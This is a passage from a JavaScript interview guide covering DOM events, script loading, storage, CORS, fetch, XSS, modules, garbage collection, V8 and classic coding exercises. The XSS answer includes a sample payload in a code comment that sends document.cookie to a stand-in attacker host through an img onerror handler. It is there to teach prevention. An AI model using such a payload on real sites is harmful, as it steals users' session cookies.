- **`event.preventDefault()`**: stops the **browser's default action** (submitting a form, following a link, a checkbox toggling). The event **still propagates**.
- **`event.stopPropagation()`**: stops the event **travelling further** up or down the DOM. Parent listeners won't run, but the default action still happens.
- **`stopImmediatePropagation()`** also stops the other listeners on the same element.

```js
form.addEventListener("submit", (e) => {
  e.preventDefault();         // handle with JS instead of reloading the page
  submitViaFetch(new FormData(form));
});

modal.addEventListener("click", (e) => {
  e.stopPropagation();        // a click inside the modal shouldn't reach the backdrop's close handler
});
```

`return false` in an inline/jQuery handler did both. In `addEventListener` it does neither, so call them explicitly.

### js87 | What is the difference between `<script>`, `<script async>` and `<script defer>`?

| | Download | Execution | Order kept? |
|---|---|---|---|
| `<script>` | **blocks HTML parsing** | immediately, while parsing waits | yes |
| `async` | in parallel with parsing | **as soon as it's downloaded** (pauses parsing then) | **no** |
| `defer` | in parallel with parsing | **after parsing finishes**, before `DOMContentLoaded` | **yes** |

```html
<script src="analytics.js" async></script>   <!-- independent, order doesn't matter -->
<script src="app.js" defer></script>         <!-- needs the DOM, keeps order -->
<script type="module" src="main.js"></script> <!-- modules are deferred by default -->
```

Guidance: use `defer` for app code that needs the DOM; `async` for independent third-party scripts (analytics, ads). A plain `<script>` in `<head>` delays the first render, which is why scripts were traditionally put at the end of `<body>`.

### js88 | What is the difference between DOMContentLoaded and load?

- **`DOMContentLoaded`** fires on `document` when the **HTML is parsed and the DOM is built** (deferred scripts have run). Images, stylesheets and iframes may still be loading.
- **`load`** fires on `window` when **everything** has finished: images, CSS, fonts, iframes.

```js
document.addEventListener("DOMContentLoaded", () => {
  // safe to query and attach to DOM elements
});
window.addEventListener("load", () => {
  // image sizes are known; full page ready
});
```

Use `DOMContentLoaded` to initialise UI (it fires sooner); use `load` when you need loaded resources. Related: `beforeunload` (warn about unsaved changes) and `visibilitychange` (the tab is hidden or shown).

### js89 | What are the differences between cookies, localStorage and sessionStorage?

| | Cookie | localStorage | sessionStorage |
|---|---|---|---|
| Capacity | ~4 KB | ~5–10 MB | ~5 MB |
| Expiry | set by `Expires`/`Max-Age` (or the session) | **never** (until cleared) | when the **tab closes** |
| Sent to the server | **automatically, with every request** to that domain | no | no |
| Scope | domain + path | origin, shared by every tab | origin + **that tab only** |
| Readable from JS | yes, unless `HttpOnly` | yes | yes |

```js
localStorage.setItem("theme", "dark");
JSON.parse(localStorage.getItem("cart") ?? "[]");   // stores strings only
sessionStorage.setItem("step", "2");
document.cookie = "lang=en; Max-Age=86400; Path=/; Secure; SameSite=Lax";
```

Security:
- Store **auth tokens in `HttpOnly; Secure; SameSite` cookies**: JS can't read them, so XSS can't steal them.
- Anything in localStorage is readable by any script on the page, including injected ones.
- Cookies are sent automatically, which is why CSRF protection (`SameSite`, CSRF tokens) is needed.

### js90 | What are the same-origin policy and CORS?

The **same-origin policy** stops a page from **reading responses** from a different origin. The origin is **protocol + host + port**: `https://a.com` and `https://api.a.com` are different origins. It prevents a malicious site from reading your bank's data using your logged-in cookies.

**CORS** (Cross-Origin Resource Sharing) lets the **server** opt in to cross-origin access with response headers:

```
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
```

- **Simple requests** (GET or POST with basic headers) go straight out; the browser blocks reading the response if the headers don't allow it.
- **Preflight**: for other methods (PUT, DELETE), custom headers or a JSON content-type, the browser first sends an **`OPTIONS`** request to ask permission.
- With credentials (cookies), `Allow-Origin` can't be `*`.

Key point: CORS is **enforced by the browser**. Server-to-server calls (or curl) aren't affected. The fix for a CORS error belongs on the **server**, not in frontend code.

### js91 | How does fetch work, and why doesn't it reject on a 404?

```js
async function getUser(id) {
  const res = await fetch(`/api/users/${id}`, {
    method: "GET",
    headers: { Authorization: `Bearer ${token}` },
    signal: AbortSignal.timeout(5000),
  });
  if (!res.ok) {                          // res.ok is true only for status 200-299
    throw new Error(`HTTP ${res.status}`);
  }
  return res.json();                      // reading the body is a second async step
}

await fetch("/api/users", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ name: "A" }),
  credentials: "include",                 // send cookies cross-origin
});
```

- `fetch` returns a promise that **only rejects on network failures** (offline, DNS, CORS blocked, aborted). An HTTP **404 or 500 still fulfils**, so you have to check `res.ok` / `res.status` yourself.
- The body is a stream and can be read once: `res.json()`, `res.text()`, `res.blob()`.
- Compared with `XMLHttpRequest`, fetch is promise-based and cleaner. Axios adds automatic JSON parsing, rejection on non-2xx, interceptors and timeouts.

### js92 | What is XSS, and how do you prevent it?

**Cross-Site Scripting (XSS)**: an attacker gets **their script to run on your page**, usually through user input you render without escaping. The script can steal tokens from localStorage, act as the user, or change the page.

```js
// VULNERABLE: comment = "<img src=x onerror='fetch(`//evil.com?c=`+document.cookie)'>"
div.innerHTML = comment;

// SAFE: rendered as text, not parsed as HTML
div.textContent = comment;
```

Prevention:
- **Escape output**. Use `textContent`, not `innerHTML`. React escapes `{value}` by default; `dangerouslySetInnerHTML` bypasses that.
- **Sanitise** any HTML you must render (e.g. DOMPurify).
- Never pass user input to `eval`, `new Function` or `setTimeout(string)`, and don't let it into `href="javascript:..."`.
- **Content-Security-Policy** header: blocks inline and unknown scripts.
- **HttpOnly cookies** for session tokens, so stolen script access can't read them.
- Validate input on the **server** as well.

Types: **stored** (saved in the database, shown to every viewer), **reflected** (in the URL, bounced back by the server), **DOM-based** (client-side JS writes untrusted data into the DOM).

### js93 | What are reflow and repaint?

- **Reflow (layout)**: the browser recalculates the **position and size** of elements. Caused by changing geometry: width, height, margins, fonts, adding or removing elements, or even **reading** layout values like `offsetHeight` after a change. It's expensive and can cascade to children and ancestors.
- **Repaint**: redrawing pixels when only **visual style** changes (colour, background, visibility) and the layout doesn't. Cheaper.
- **Composite-only** changes (`transform`, `opacity`) are cheapest: the GPU handles them without layout or paint.

**Layout thrashing** is alternating reads and writes in a loop, which forces a reflow on every iteration:

```js
// bad: read + write each iteration -> a forced reflow every time
items.forEach((el) => { el.style.width = el.offsetWidth + 10 + "px"; });

// good: batch the reads, then batch the writes
const widths = items.map((el) => el.offsetWidth);
items.forEach((el, i) => { el.style.width = widths[i] + 10 + "px"; });
```

Tips: animate `transform`/`opacity`, batch DOM changes (`DocumentFragment`, or change a CSS class instead of many styles), and use `requestAnimationFrame` for visual updates.

## Modules, memory and the runtime

### js94 | What is the difference between ES Modules and CommonJS?

| | CommonJS (CJS) | ES Modules (ESM) |
|---|---|---|
| Syntax | `require()` / `module.exports` | `import` / `export` |
| Loading | **synchronous**, at runtime | **asynchronous**; dependencies are resolved before the code runs |
| Structure | dynamic: `require` can go anywhere, in an `if` | **static**: imports at the top level (use `import()` for dynamic) |
| Bindings | a **copy** of the exported value | **live bindings**: you see updates to the exported variable |
| Tree shaking | hard | easy (static analysis) |
| Top-level `await` | no | yes |
| `this` at the top | `module.exports` | `undefined` |
| Where | Node's traditional system | the standard: browsers and modern Node |

```js
// CJS
const { add } = require("./math");
module.exports = { add };

// ESM
import { add } from "./math.js";
export const sub = (a, b) => a - b;
export default function main() {}
```

In Node, ESM is enabled by `"type": "module"` in package.json or the `.mjs` extension. ESM can import CJS; `require` of ESM is only supported in newer Node versions.

### js95 | What are dynamic imports and tree shaking?

**Dynamic import**: `import("./module.js")` loads a module **on demand** and returns a promise. Bundlers split it into a separate chunk (**code splitting**), so the initial bundle gets smaller.

```js
button.addEventListener("click", async () => {
  const { openEditor } = await import("./editor.js"); // downloaded only when needed
  openEditor();
});

// React: const Chart = React.lazy(() => import("./Chart"));
```

**Tree shaking**: the bundler (Rollup, Vite, webpack) **removes exports that are never imported**. It relies on ESM's **static** `import`/`export`.

```js
// utils.js exports add, sub, mul; app.js only imports add
import { add } from "./utils.js";   // sub and mul are dropped from the bundle
```

It helps to: use ESM builds of libraries, avoid side effects at the top level of modules (`"sideEffects": false` in package.json), and import specific functions (`import debounce from "lodash-es/debounce"`).

### js96 | How does garbage collection work in JavaScript?

Memory is managed automatically. The engine frees objects that are no longer **reachable**.

**Mark-and-sweep** (the basis of modern GCs):
1. Start from the **roots**: global variables, the current call stack, active closures.
2. **Mark** everything reachable from the roots, following references.
3. **Sweep**: free everything that wasn't marked.

Because it's based on reachability, **circular references aren't a problem**: two objects that point at each other but are unreachable from the roots both get collected. Old reference counting couldn't handle that.

V8's optimisations:
- **Generational**: most objects die young, so new objects go in a small "young generation" collected often and quickly (scavenge). Survivors are promoted to the "old generation", collected less often.
- **Incremental and concurrent** marking, so pauses stay short.

You can't trigger GC yourself. You help it by **dropping references** to things you no longer need.

### js97 | What are common causes of memory leaks in JavaScript?

A leak is memory that's **no longer needed but still reachable**, so the GC can't free it.

1. **Event listeners never removed**, especially on long-lived elements or `window`:
```js
window.addEventListener("resize", onResize);
// on teardown:
window.removeEventListener("resize", onResize); // or use an AbortController signal
```
2. **Timers never cleared**: a `setInterval` whose callback references big objects.
3. **Closures** holding large data longer than needed.
4. **Accidental globals** (`x = ...` without a declaration, outside strict mode).
5. **Detached DOM nodes**: an element removed from the page but still referenced from JS.
6. **Unbounded caches or Maps** that only ever grow (use an LRU or a WeakMap).
7. In React: subscriptions and intervals not cleaned up in `useEffect`.

Finding them: Chrome DevTools → Memory → compare **heap snapshots** over time; the Performance monitor shows a JS heap that keeps climbing.

### js98 | How does error handling work in JavaScript (error types, finally, custom errors)?

Built-in error types: `Error`, `TypeError` (wrong type, e.g. calling undefined), `ReferenceError` (undeclared variable), `SyntaxError`, `RangeError` (e.g. invalid array length, stack overflow), `URIError`, and `AggregateError` (from `Promise.any`).

```js
try {
  riskyOperation();
} catch (err) {
  if (err instanceof TypeError) handleType(err);
  else throw err;                 // rethrow what you can't handle
} finally {
  cleanup();                      // ALWAYS runs: success, error, or even a return in try
}

// custom error class
class ValidationError extends Error {
  constructor(field, message) {
    super(message);
    this.name = "ValidationError";
    this.field = field;
  }
}
try {
  throw new ValidationError("email", "Invalid email");
} catch (e) {
  if (e instanceof ValidationError) showFieldError(e.field, e.message);
}

// wrap with a cause (ES2022)
throw new Error("Failed to load user", { cause: err });
```

An error **propagates** up the call stack until a `catch` handles it; if nothing does, it's an uncaught error. Always throw `Error` objects (they carry `message` and `stack`), never plain strings.

### js99 | What is a polyfill, and how is it different from transpiling (Babel)?

- **Polyfill**: code that **adds a missing API** at runtime, so newer **features** work in older environments. It's written in old JS and checks before patching:
```js
if (!Array.prototype.includes) {
  Array.prototype.includes = function (search, from) { /* ... */ };
}
```
Examples: `Promise`, `fetch`, `Array.prototype.flat`, `structuredClone`. Libraries like **core-js** provide them.

- **Transpiler** (Babel, TypeScript, SWC, esbuild): **rewrites new syntax** into older syntax at **build time**. Syntax can't be polyfilled:
```js
// input
const f = (a = 1) => a ?? 0;
// output (roughly)
var f = function (a) { if (a === void 0) a = 1; return a !== null && a !== void 0 ? a : 0; };
```

Rule: new **syntax** (arrows, classes, `?.`, `??`) needs a **transpiler**; new **APIs/methods** need a **polyfill**. Modern setups (Babel preset-env + browserslist) do both, but only for the browsers you target.

### js100 | How does a JavaScript engine like V8 run your code?

V8 (Chrome, Node.js, Deno) turns JS into machine code with a **JIT (just-in-time) compiler**:

1. **Parse** the source into an **AST** (abstract syntax tree).
2. **Ignition** (the interpreter) compiles the AST to **bytecode** and runs it straight away, so start-up is fast.
3. While it runs, V8 **profiles** the code. "Hot" functions (run often, with stable types) are sent to **TurboFan**, the optimising compiler, which produces fast machine code based on the types it has seen.
4. If those assumptions break (e.g. a function that always got numbers now gets a string), V8 **deoptimises** back to bytecode.

Optimisations worth knowing:
- **Hidden classes (shapes)**: objects created with the same properties in the same order share a shape, which makes property access fast. Adding properties in different orders, or `delete`-ing them, creates new shapes and slows things down.
- **Inline caching**: remembers where a property was found for a given shape at each call site.

Practical tips: initialise every property in the constructor, keep functions monomorphic (the same argument types), avoid `delete` on hot objects. JS is "interpreted" in the sense that there's no compile step for you, but it's JIT-compiled under the hood.

## Classic implementations

### js101 | Implement a deep clone function.

```js
function deepClone(value, seen = new WeakMap()) {
  if (value === null || typeof value !== "object") return value; // primitives and functions
  if (seen.has(value)) return seen.get(value);                    // circular reference

  if (value instanceof Date) return new Date(value);
  if (value instanceof RegExp) return new RegExp(value.source, value.flags);
  if (value instanceof Map) {
    const m = new Map();
    seen.set(value, m);
    value.forEach((v, k) => m.set(deepClone(k, seen), deepClone(v, seen)));
    return m;
  }
  if (value instanceof Set) {
    const s = new Set();
    seen.set(value, s);
    value.forEach((v) => s.add(deepClone(v, seen)));
    return s;
  }

  const copy = Array.isArray(value) ? [] : Object.create(Object.getPrototypeOf(value));
  seen.set(value, copy);
  for (const key of Reflect.ownKeys(value)) {       // includes symbol keys
    copy[key] = deepClone(value[key], seen);
  }
  return copy;
}

const a = { n: 1, d: new Date(), nested: { list: [1, { x: 2 }] } };
a.self = a;                                  // circular
const b = deepClone(a);
b.nested.list[1].x = 99;                     // a is untouched
b.self === b;                                // true
```

What's checked: the primitive base case, recursion for arrays and objects, **circular references** (a WeakMap of already-copied objects), and special types like Date. In real code, `structuredClone` covers most of this.

### js102 | Implement array flatten without using flat().

```js
// recursive, with a depth limit
function flatten(arr, depth = Infinity) {
  const out = [];
  for (const item of arr) {
    if (Array.isArray(item) && depth > 0) out.push(...flatten(item, depth - 1));
    else out.push(item);
  }
  return out;
}

// with reduce
const flattenAll = (arr) =>
  arr.reduce((acc, x) => acc.concat(Array.isArray(x) ? flattenAll(x) : x), []);

// iterative with a stack (no recursion-depth limits for deep nesting)
function flattenIter(arr) {
  const stack = [...arr];
  const out = [];
  while (stack.length) {
    const next = stack.pop();
    if (Array.isArray(next)) stack.push(...next);
    else out.push(next);
  }
  return out.reverse();
}

flatten([1, [2, [3, [4]]]], 1);   // [1, 2, [3, [4]]]
flatten([1, [2, [3, [4]]]]);      // [1, 2, 3, 4]
```

Follow-ups: flattening a nested **object** into dotted keys (`{ a: { b: 1 } }` → `{ "a.b": 1 }`) uses the same recursion with a key prefix.

### js103 | Implement a retry with exponential backoff for an async function.

```js
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function retry(fn, { retries = 3, baseDelay = 200, shouldRetry = () => true } = {}) {
  let attempt = 0;
  while (true) {
    try {
      return await fn();
    } catch (err) {
      attempt++;
      if (attempt > retries || !shouldRetry(err)) throw err;
      const backoff = baseDelay * 2 ** (attempt - 1);       // 200, 400, 800...
      const jitter = Math.random() * backoff;              // spread retries out
      await sleep(backoff / 2 + jitter / 2);
    }
  }
}

const data = await retry(() => fetchJson("/api/orders"), {
  retries: 4,
  shouldRetry: (e) => e.status === undefined || e.status >= 500 || e.status === 429,
});
```

Points to mention:
- **Exponential** backoff gives a struggling server room to recover.
- **Jitter** stops thousands of clients retrying at the same instant (thundering herd).
- Retry only **transient** errors (network failures, 5xx, 429), never 4xx validation errors.
- Retry only **idempotent** operations (or use idempotency keys).
- Add a total timeout. At system level, pair it with a **circuit breaker**.

### js104 | Implement a simple event emitter (pub/sub).

```js
class EventEmitter {
  #events = new Map();               // eventName -> Set of listeners

  on(event, listener) {
    if (!this.#events.has(event)) this.#events.set(event, new Set());
    this.#events.get(event).add(listener);
    return () => this.off(event, listener);   // return an unsubscribe function
  }

  off(event, listener) {
    this.#events.get(event)?.delete(listener);
  }

  once(event, listener) {
    const wrapper = (...args) => {
      this.off(event, wrapper);
      listener.apply(this, args);
    };
    return this.on(event, wrapper);
  }

  emit(event, ...args) {
    const listeners = this.#events.get(event);
    if (!listeners) return false;
    [...listeners].forEach((fn) => fn.apply(this, args)); // copy: listeners may unsubscribe while running
    return true;
  }
}

const bus = new EventEmitter();
const unsubscribe = bus.on("login", (user) => console.log("welcome", user));
bus.once("login", () => console.log("first login only"));
bus.emit("login", "Shubam");
unsubscribe();
```

This is the **observer pattern**. The same design underlies DOM events, Node's EventEmitter, Redux store subscriptions and message brokers.
